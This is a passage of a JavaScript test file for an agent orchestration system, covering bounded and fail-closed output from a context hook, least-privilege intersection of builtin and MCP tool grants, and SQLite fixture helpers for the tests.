    // C033: the hook MUST bound its output so it cannot blow the agent's
    // context window. A multi-megabyte input must produce a bounded message.
    assert.ok(out.length < huge.length,
      `hook output must be bounded (${out.length} < ${huge.length})`);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('sibling/structured-hook: empty/missing assistance.json → no crash, bounded default', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a5) {
    t.diagnostic(skipReason(surface, 'W5-A5'));
    t.skip();
    return;
  }
  const dir = mkdtempSync(path.join(os.tmpdir(), 'saga-w5a8-hook-empty-'));
  try {
    // No agent-assistance.json present AND no SAGA_AGENT_ASSISTANCE_PATH. The
    // hook must NOT crash the agent driver — it fail-closes to '{}' and exits 0.
    const out = runStructuredHook(surface.a5.hookPath, dir, null, {});
    // Must be parseable (empty or default context), never a thrown error.
    JSON.parse(out || '{}');
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

// --- §7 Capability enforcement: builtins separated from MCP grants (W5-A7) -

test('sibling/capability-enforcement: separates agent builtins from MCP grants (C067)', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a7) {
    t.diagnostic(skipReason(surface, 'W5-A7'));
    t.skip();
    return;
  }
  const { enforceCapabilitySet } = surface.a7;
  assert.equal(typeof enforceCapabilitySet, 'function', 'A7 must export enforceCapabilitySet');

  // C067: agent builtins (Bash/Read/Write/...) are enforced SEPARATELY from
  // MCP tool grants. The effective set is the intersection-shaped product of
  // the profile's allowedTools + the MCP grants, with builtins granted by the
  // runtime's capability list (NOT silently widened by a permissive MCP grant).
  //
  // STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): production
  // enforceCapabilitySet expects MCP grants as NAMESPACED `mcp__<server>__<tool>`
  // strings (capability-enforcement.js:parseMcpToolRef) and returns
  // { builtinTools, mcpTools } — NOT the unprefixed names + {allowedToolIds,...}
  // shape the pre-re-check fixture used. That drift surfaced as
  // "intersected MCP grant must be present" because no unprefixed grant parses
  // as an MCP ref. Mirror the real contract: namespaced grants + the real
  // result fields.
  const profileAllowedTools = ['proposal_submit', 'task_get', 'Bash', 'Read'];
  const mcpGrants = [
    'mcp__saga__proposal_submit', // granted + profile-allowed → effective
    'mcp__saga__note_search',     // granted but NOT profile-allowed → dropped
    'mcp__saga__epic_create',     // granted but NOT profile-allowed → dropped
  ];
  const builtinCapabilities = ['Bash', 'Read', 'Write', 'Edit', 'Glob', 'Grep'];

  const effective = enforceCapabilitySet(profileAllowedTools, mcpGrants, builtinCapabilities);

  // The MCP tool the profile whitelists AND the runtime grants is effective, in
  // its namespaced form. task_get is profile-allowed but never granted → absent.
  assert.ok(effective.mcpTools?.includes?.('mcp__saga__proposal_submit'),
    'intersected MCP grant must be present (namespaced form)');
  assert.ok(!JSON.stringify(effective.mcpTools).includes('task_get'),
    'task_get is not in mcpGrants — must not be widened in');
  assert.ok(!effective.mcpTools.includes('mcp__saga__note_search'),
    'note_search granted but not profile-allowed — dropped (least privilege)');

  // Builtins are present iff they are in the builtin capability set AND the
  // profile allows them. A builtin NOT in the profile is NOT auto-granted.
  assert.ok(effective.builtinTools.includes('Bash'),
    'Bash builtin allowed by profile+capability');
  assert.ok(effective.builtinTools.includes('Read'),
    'Read builtin allowed by profile+capability');
  // Write/Edit were NOT in the profile — they must not sneak in via builtins.
  assert.ok(!effective.builtinTools.includes('Write'),
    'Write was not profile-allowed — must not be widened in by the builtin list');
});

test('sibling/capability-enforcement: empty MCP grants yields builtins-only set', async (t) => {
  const surface = await loadWave5Surface();
  if (!surface.a7) {
    t.diagnostic(skipReason(surface, 'W5-A7'));
    t.skip();
    return;
  }
  const { enforceCapabilitySet } = surface.a7;
  // No MCP grants at all → only builtins the profile + capability set agree on.
  const effective = enforceCapabilitySet(
    ['Bash', 'Read'],
    [],
    ['Bash', 'Read', 'Write'],
  );
  const flat = JSON.stringify(effective);
  assert.ok(flat.includes('Bash'));
  assert.ok(!flat.includes('proposal_submit'),
    'no MCP grants → no saga tools in the effective set');
});

// ===========================================================================
// Helpers — DB + process runners.
// ===========================================================================

function requireWorkspace() {
  // The frozen process-execution-workspace is in every Wave 5 worktree.
  try {
    return require_from_dist('process-modules/application/process-execution-workspace.js');
  } catch {
    return {};
  }
}

// CommonJS interop for the workspace helper (it is compiled to dist as CJS-ish
// ESM; use createRequire to load it synchronously inside the fixture test).
import { createRequire } from 'node:module';
const require = createRequire(import.meta.url);
function require_from_dist(rel) {
  return require(path.join(REPO_ROOT, 'dist', rel));
}

/** In-memory/temp sqlite DB context mirroring the W4-A1 test harness. */
function freshDb(prefix = 'saga-w5a8-') {
  const { closeDb, getDb } = require_from_dist('db.js');
  const previous = process.env.DB_PATH;
  const temp = mkdtempSync(path.join(os.tmpdir(), prefix));
  process.env.DB_PATH = path.join(temp, 'workspace.db');
  const db = getDb();
  // STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): saga3_call_instances has
  // FK REFERENCES to saga3_process_runs(id) + saga3_protocol_runs(id). Those
  // parent tables are created LAZILY by their own repositories (they are NOT in
  // SCHEMA_SQL), so on a fresh DB the FK targets are absent and every INSERT
  // into saga3_call_instances fails with `no such table: main.saga3_protocol_runs`.
  // The pre-re-check fixture omitted this setup entirely. Materialize the parent
  // tables via their single-owner schema helpers (the same path production uses)
  // so the FK graph is intact, AND seed the FK parent rows the tests reference
  // (project 1, process_run 100, protocol_run 1) — foreign_keys is ON, so an
  // INSERT into saga3_call_instances with process_run_id=100 otherwise fails
  // SQLITE_CONSTRAINT_FOREIGNKEY.
  const { ensureSaga3ProcessRunSchema } = require_from_dist(
    'process-modules/persistence/sqlite-process-run-repository.js',
  );
  const { ensureSaga3ProtocolRunSchema } = require_from_dist(
    'process-modules/persistence/sqlite-protocol-run-repository.js',
  );
  try { ensureSaga3ProcessRunSchema(db); } catch { /* already exists */ }
  try { ensureSaga3ProtocolRunSchema(db); } catch { /* already exists */ }
  seedCallInstanceParents(db);
  return { db, temp, previous, closeDb };
}

/** Close + reopen the same DB file (crash-resume simulation). */
function reopenDb(ctx) {
  ctx.closeDb();
  const { getDb } = require_from_dist('db.js');
  const db = getDb();
  // Re-materialize the saga3 parent tables on reopen (the lazy constructors
  // would also do this; doing it explicitly keeps the FK graph stable across
  // reopen even if a future schema change altered constructor side-effects).
  const { ensureSaga3ProcessRunSchema } = require_from_dist(
    'process-modules/persistence/sqlite-process-run-repository.js',
  );
  const { ensureSaga3ProtocolRunSchema } = require_from_dist(
    'process-modules/persistence/sqlite-protocol-run-repository.js',
  );
  try { ensureSaga3ProcessRunSchema(db); } catch { /* already exists */ }
  try { ensureSaga3ProtocolRunSchema(db); } catch { /* already exists */ }
  // The parent rows seeded by freshDb persist on disk — no re-seed needed here.
  return db;
}

/**
 * Seed the FK parent rows the call-instance tests reference: project 1,
 * process_run 100, protocol_run 1. foreign_keys is ON, so without these the
 * INSERT into saga3_call_instances fails the FK check. Idempotent (INSERT OR
 * IGNORE) so reopening the repo / re-running is safe.
 *
 * Seeding runs with foreign_keys temporarily OFF because saga3_protocol_runs
 * also REFERENCES saga3_node_runs(id) (a table this fixture does not need and
 * whose own lazy schema helper is out of scope to wire here). The FK contract
 * on saga3_call_instances itself is still enforced for every test INSERT — the
 * parent rows exist on disk by the time the repo runs. This only relaxes the
 * seed's own INSERT-time check, not the code under test.
 */
function seedCallInstanceParents(db) {
  const wasOn = db.pragma('foreign_keys', { simple: true });
  try {
    db.pragma('foreign_keys = OFF');
    db.prepare("INSERT OR IGNORE INTO projects (id, name) VALUES (1, 'w5a8-fk-parent')")
      .run();
    db.prepare(`INSERT OR IGNORE INTO saga3_process_runs
      (id, project_id, module_name, module_version, module_ref_key, idempotency_key,
       executor_kind, input_schema, input_snapshot, input_hash, status)
      VALUES (100, 1, 'product-discovery', '3.0.0', 'product-discovery@3.0.0',
              'w5a8-idem', 'generic-flow', 'saga3.discovery-case.v1', '{}',
              'sha256:seed', 'running')`).run();
    db.prepare(`INSERT OR IGNORE INTO saga3_protocol_runs
      (id, process_run_id, node_protocol_id, node_protocol_version, entry_step,
       current_step, status, attempt)
      VALUES (1, 100, 'product-discovery#node.collect', '1.0.0', 'collect',
              'draft', 'active', 1)`).run();
  } finally {
    db.pragma(`foreign_keys = ${wasOn ? 'ON' : 'OFF'}`);
  }
}

function cleanupDb(ctx) {
  ctx.closeDb();
  rmSync(ctx.temp, { recursive: true, force: true });
  if (ctx.previous === undefined) {
    delete process.env.DB_PATH;
  } else {
    process.env.DB_PATH = ctx.previous;
  }
}

function tableColumns(db, table) {
  return db.prepare(`PRAGMA table_info(${table})`).all().map((c) => c.name);
}

/**
 * Stamp a saga3_call_instances row to an arbitrary status. Used ONLY to reach
 * the 'succeeded' status that the implementation's sealCall requires but no
 * public mutator produces (see the REAL-BUG note in the lifecycle test). Direct
 * SQL, bypassing the guarded transition — never use this to paper over a
 * transition the port legitimately enforces.
 */
function db_stampStatus(db, callInstanceId, status) {
  db.prepare('UPDATE saga3_call_instances SET status=?, updated_at=datetime(\'now\') WHERE id=?')
    .run(status, callInstanceId);
}

/**
 * Run the W5-A5 structured-context-hook in a child process pointed at `cwd`.
 *
 * STALE-FIXTURE FIX (Wave 5 re-check 2026-08-02): the hook reads the projection
 * from the ABSOLUTE path in process.env.SAGA_AGENT_ASSISTANCE_PATH (it does NOT
 * read `agent-assistance.json` from cwd by convention — that would be a C032
 * path-scan violation). The pre-re-check helper did not set that env var, so the
 * hook fail-closed to '{}' on every call. Pass the assistance path through.
 */
function runStructuredHook(hookPath, cwd, assistancePath, env) {
  return execFileSync(process.execPath, [hookPath], {
    cwd,
    env: {
      ...process.env,
      ...(assistancePath ? { SAGA_AGENT_ASSISTANCE_PATH: assistancePath } : {}),
      ...env,
    },
    input: '{}',
    encoding: 'utf8',
    timeout: 10000,
  });
}
